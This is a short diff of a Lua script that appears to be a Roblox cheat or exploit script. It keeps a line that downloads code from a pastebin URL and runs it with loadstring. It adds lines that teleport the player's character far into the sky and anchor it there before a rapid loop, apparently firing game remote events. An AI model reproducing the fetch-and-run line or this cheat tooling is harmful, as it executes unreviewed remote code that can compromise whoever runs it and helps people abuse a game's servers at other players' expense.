@@ -24,6 +24,10 @@ end)
 
 
 loadstring(game:HttpGet("https://pastebin.com/raw/Yu12RUkY"))()
+task.wait(1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,1000000,0)
+task.wait(1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
 
 while wait(0.1) do
 local args = {
